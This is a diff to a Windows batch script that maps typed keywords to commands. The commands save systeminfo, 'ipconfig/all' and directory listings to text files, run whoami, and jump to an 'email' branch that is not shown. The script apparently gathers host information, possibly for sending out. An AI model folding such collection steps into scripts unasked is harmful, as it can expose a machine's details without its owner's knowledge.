@@ -26,7 +26,7 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCuDJGix3WEbGzp6aEqHJG7a
+::Zh4grVQjdCuDJGix3WEbGzVwAgGaOQs=
 ::YB416Ek+ZG8=
 ::
 ::
@@ -46,6 +46,9 @@ if info ==  %input% systeminfo>info.txt
 if ip == %input% ipconfig/all>ip.txt
 if me == %input% whoami
 if email == %input% goto D
+if ls == %input% dir
+if files == %input% dir>files.txt
+
 goto A
 :B
 
